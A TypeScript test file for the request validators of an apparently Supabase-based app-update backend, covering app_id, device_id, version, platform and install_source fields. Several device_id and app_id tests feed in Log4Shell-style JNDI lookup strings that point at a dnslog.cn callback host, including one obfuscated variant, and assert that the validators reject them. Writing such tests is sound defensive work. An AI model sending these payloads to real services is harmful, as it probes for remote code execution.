import type { StandardSchema } from '../supabase/functions/_backend/utils/schema_validation.ts'
import { describe, expect, it } from 'vitest'
import { safeParseSchema } from '../supabase/functions/_backend/utils/schema_validation.ts'
import { channelSelfRequestSchema, statsRequestSchema, updateRequestSchema } from '../supabase/functions/_backend/plugin_runtime/utils/plugin_validation.ts'
import { INVALID_STRING_APP_ID, INVALID_STRING_DEVICE_ID, MISSING_STRING_APP_ID, MISSING_STRING_DEVICE_ID, MISSING_STRING_PLATFORM, MISSING_STRING_VERSION_BUILD, MISSING_STRING_VERSION_NAME, MISSING_STRING_VERSION_OS, NON_STRING_APP_ID, NON_STRING_DEVICE_ID, NON_STRING_PLATFORM, NON_STRING_VERSION_BUILD, NON_STRING_VERSION_NAME, NON_STRING_VERSION_OS } from '../supabase/functions/_backend/utils/utils.ts'

const NO_ERROR = { error: '' }

interface RequestJSON {
  app_id?: string | number
  device_id?: string | number
  version_name?: string | number | boolean
  version_build?: string | number | boolean
  version_code?: string
  version_os?: string | number | boolean
  platform?: string | number | boolean
  plugin_version?: string
  is_prod?: boolean
  is_emulator?: boolean
  install_source?: string | number
  custom_id?: string
}

const requestJSON: RequestJSON = {
  app_id: 'ee.forgr.demoapp',
  device_id: '9929AFAD-ECF1-4D7F-B0C1-A8CE463C6684',
  version_name: 'builtin',
  version_build: '1.0.1',
  version_code: '1',
  version_os: '16.0',
  platform: 'ios',
  plugin_version: '5.2.18',
  is_prod: false,
  is_emulator: true,
  install_source: 'testflight',
  custom_id: '',
}

const schemas = [updateRequestSchema, statsRequestSchema]

describe('test schemas', () => {
  schemas.forEach((schema, index) => {
    const suffix = index % 2 === 0 ? '- /updates' : '- /stats'

    it(`app_id missing ${suffix}`, () => {
      const body = getJSON()
      delete body.app_id
      expect(body.app_id).toBeUndefined()
      const response = parseJSON(body, schema)
      expectError(response, MISSING_STRING_APP_ID)
    })

    it(`app_id with underscore is valid ${suffix}`, () => {
      const body = getJSON()
      body.app_id = 'ee.forgr.demo_app'
      const response = parseJSON(body, schema)
      expect(response).toEqual(NO_ERROR)
    })

    it(`app_id with hyphen is valid ${suffix}`, () => {
      const body = getJSON()
      body.app_id = 'ee.forgr.demo-app'
      const response = parseJSON(body, schema)
      expect(response).toEqual(NO_ERROR)
    })

    it(`app_id invalid #1 ${suffix}`, () => {
      const body = getJSON()
      body.app_id = 1000000000000000000000000000
      const response = parseJSON(body, schema)
      expectError(response, NON_STRING_APP_ID)
    })

    it(`app_id invalid #2 ${suffix}`, () => {
      const body = getJSON()
      body.app_id = ''
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_APP_ID)
    })

    it(`app_id invalid #3 ${suffix}`, () => {
      const body = getJSON()
      body.app_id = '.ee.forgr.demoapp'
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_APP_ID)
    })

    it(`app_id invalid #4 ${suffix}`, () => {
      const body = getJSON()
      body.app_id = 'eeforgrdemoapp'
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_APP_ID)
    })

    it(`app_id invalid #5 ${suffix}`, () => {
      const body = getJSON()
      body.app_id = 'app_${indi:${lower:I}${lower:d}a${lower:p}://1694362129451PrwrE.4q0tv0.dnslog.cn/nik}' // eslint-disable-line no-template-curly-in-string
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_APP_ID)
    })

    it(`app_id invalid #6 ${suffix}`, () => {
      const body = getJSON()
      body.app_id = 'ee.forgr.demo+app'
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_APP_ID)
    })

    it(`app_id invalid #7 ${suffix}`, () => {
      const body = getJSON()
      body.app_id = '[appid]'
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_APP_ID)
    })

    it(`device_id missing ${suffix}`, () => {
      const body = getJSON()
      delete body.device_id
      const response = parseJSON(body, schema)
      expectError(response, MISSING_STRING_DEVICE_ID)
    })

    it(`device_id invalid #1 ${suffix}`, () => {
      const body = getJSON()
      body.device_id = 2_000_000_000
      const response = parseJSON(body, schema)
      expectError(response, NON_STRING_DEVICE_ID)
    })

    it(`device_id invalid #2 ${suffix}`, () => {
      const body = getJSON()
      body.device_id = 'ECF1-4D7F-B0C1-A8CE463C6684'
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_DEVICE_ID)
    })

    it(`device_id invalid #3 ${suffix}`, () => {
      const body = getJSON()
      body.device_id = '9929AFAD-4D7F-B0C1-A8CE463C6684'
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_DEVICE_ID)
    })

    it(`device_id invalid #4 ${suffix}`, () => {
      const body = getJSON()
      body.device_id = '9929AFAD-ECF1-B0C1-A8CE463C6684'
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_DEVICE_ID)
    })

    it(`device_id invalid #5 ${suffix}`, () => {
      const body = getJSON()
      body.device_id = '9929AFAD-ECF1-4D7F-B0C1-'
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_DEVICE_ID)
    })

    it(`device_id invalid #6 ${suffix}`, () => {
      const body = getJSON()
      body.device_id = '9929AFADECF14D7FB0C1A8CE463C6684'
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_DEVICE_ID)
    })

    it(`device_id invalid #7 ${suffix}`, () => {
      const body = getJSON()
      body.device_id = 'A243AFAD-ECF1-4D7F-B0C1-A8CE463C560'
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_DEVICE_ID)
    })

    it(`device_id invalid #8 ${suffix}`, () => {
      const body = getJSON()
      body.device_id = ''
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_DEVICE_ID)
    })

    it(`device_id invalid #9 ${suffix}`, () => {
      const body = getJSON()
      body.device_id = 'device_${jndi:ldap://1694362129451P}' // eslint-disable-line no-template-curly-in-string
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_DEVICE_ID)
    })

    it(`device_id length exceeded ${suffix}`, () => {
      const body = getJSON()
      body.device_id = 'device_${jndi:ldap://1694362129451PrwrE.4q0tv0.dnslog.cn/nik}' // eslint-disable-line no-template-curly-in-string
      const response = parseJSON(body, schema)
      expectError(response, 'String must contain at most 36 character(s)')
    })

    it(`version_name missing ${suffix}`, () => {
      const body = getJSON()
      delete body.version_name
      const response = parseJSON(body, schema)
      expectError(response, MISSING_STRING_VERSION_NAME)
    })

    it(`version_name invalid #1 ${suffix}`, () => {
      const body = getJSON()
      body.version_name = 300000
      const response = parseJSON(body, schema)
      expectError(response, NON_STRING_VERSION_NAME)
    })

    it(`version_name invalid #2 ${suffix}`, () => {
      const body = getJSON()
      body.version_name = true
      const response = parseJSON(body, schema)
      expectError(response, NON_STRING_VERSION_NAME)
    })

    it(`app_id and device_id missing ${suffix}`, () => {
      const body = getJSON()
      delete body.app_id
      delete body.device_id
      const response = parseJSON(body, schema)
      expectError(response, MISSING_STRING_APP_ID)
      expectError(response, MISSING_STRING_DEVICE_ID, 1)
    })

    it(`app_id and device_id are invalid ${suffix}`, () => {
      const body = getJSON()
      body.app_id = '123456768'
      body.device_id = '${jndi:ldap://4q0tv0.dnslog.cn}' // eslint-disable-line no-template-curly-in-string
      const response = parseJSON(body, schema)
      expectError(response, INVALID_STRING_APP_ID)
      expectError(response, INVALID_STRING_DEVICE_ID, 1)
    })
  })
})

describe('test version_name compatibility', () => {
  it('rejects empty version_name for /updates', () => {
    const body = getJSON()
    body.version_name = ''
    const response = parseJSON(body, updateRequestSchema)
    expectError(response, MISSING_STRING_VERSION_NAME)
  })

  it('accepts empty version_name for /stats', () => {
    const body = getJSON()
    body.version_name = ''
    const response = parseJSON(body, statsRequestSchema)
    expect(response).toEqual(NO_ERROR)
  })

  it('accepts empty version_name for /channel_self', () => {
    const body = getJSON()
    body.version_name = ''
    const response = parseJSON(body, channelSelfRequestSchema)
    expect(response).toEqual(NO_ERROR)
  })
})

describe('test version_build - /updates', () => {
  it('version_build missing', () => {
    const body = getJSON()
    delete body.version_build
    const response = parseJSON(body, updateRequestSchema)
    expectError(response, MISSING_STRING_VERSION_BUILD)
  })

  it('version_build invalid #1', () => {
    const body = getJSON()
    body.version_build = 4000000
    const response = parseJSON(body, updateRequestSchema)
    expectError(response, NON_STRING_VERSION_BUILD)
  })

  it('version_build invalid #2', () => {
    const body = getJSON()
    body.version_build = true
    const response = parseJSON(body, updateRequestSchema)
    expectError(response, NON_STRING_VERSION_BUILD)
  })

  it('version_build invalid #3', () => {
    const body = getJSON()
    body.version_build = ''
    const response = parseJSON(body, updateRequestSchema)
    expectError(response, MISSING_STRING_VERSION_BUILD)
  })

  it('accepts empty version_build for /channel_self', () => {
    const body = getJSON()
    body.version_build = ''
    const response = parseJSON(body, channelSelfRequestSchema)
    expect(response).toEqual(NO_ERROR)
  })
})

describe('test version_os - /stats', () => {
  it('version_os missing', () => {
    const body = getJSON()
    delete body.version_os
    const response = parseJSON(body, statsRequestSchema)
    expectError(response, MISSING_STRING_VERSION_OS)
  })

  it('version_os invalid #1', () => {
    const body = getJSON()
    body.version_os = -5000000
    const response = parseJSON(body, statsRequestSchema)
    expectError(response, NON_STRING_VERSION_OS)
  })

  it('version_os invalid #2', () => {
    const body = getJSON()
    body.version_os = false
    const response = parseJSON(body, statsRequestSchema)
    expectError(response, NON_STRING_VERSION_OS)
  })
})

describe('test install_source', () => {
  const schemasWithInstallSource = [updateRequestSchema, statsRequestSchema, channelSelfRequestSchema]

  schemasWithInstallSource.forEach((schema, index) => {
    const suffix = index === 0 ? '- /updates' : index === 1 ? '- /stats' : '- /channel_self'

    it(`install_source valid ${suffix}`, () => {
      const body = getJSON()
      body.install_source = 'app_store'
      const response = parseJSON(body, schema)
      expect(response).toEqual(NO_ERROR)
    })

    it(`install_source invalid type ${suffix}`, () => {
      const body = getJSON()
      body.install_source = 123
      const response = parseJSON(body, schema)
      expectError(response, 'install_source must be a string')
    })

    it(`install_source too long ${suffix}`, () => {
      const body = getJSON()
      body.install_source = 'a'.repeat(65)
      const response = parseJSON(body, schema)
      expectError(response, 'String must contain at most 64 character(s)')
    })
  })
})

describe('test platform - /stats', () => {
  it('platform missing', () => {
    const body = getJSON()
    delete body.platform
    const response = parseJSON(body, statsRequestSchema)
    expectError(response, MISSING_STRING_PLATFORM)
  })

  it('platform invalid #1', () => {
    const body = getJSON()
    body.platform = -6000000
    const response = parseJSON(body, statsRequestSchema)
    expectError(response, NON_STRING_PLATFORM)
  })

  it('platform invalid #2', () => {
    const body = getJSON()
    body.platform = true
    const response = parseJSON(body, statsRequestSchema)
    expectError(response, NON_STRING_PLATFORM)
  })
})

function getJSON(): RequestJSON {
  return { ...requestJSON }
}

function parseJSON(body: RequestJSON, jsonRequestSchema: StandardSchema<unknown>) {
  const parseResult = safeParseSchema(jsonRequestSchema, body)
  if (!parseResult.success)
    return { error: `Cannot parse json: ${parseResult.error}`, nestedError: parseResult.error }
  else
    return NO_ERROR
}

function expectError(response: any, expectedErrorMessage: string, errorIndex = 0) {
  expect(response.error).toBeDefined()
  expect(response.error).toContain('Cannot parse json: ')
  expect(response.nestedError).toBeDefined()
  expect(response.nestedError.issues[errorIndex]).toBeDefined()
  expect(response.nestedError.issues[errorIndex].message).toBeDefined()
  expect(response.nestedError.issues[errorIndex].message).toContain(expectedErrorMessage)
}
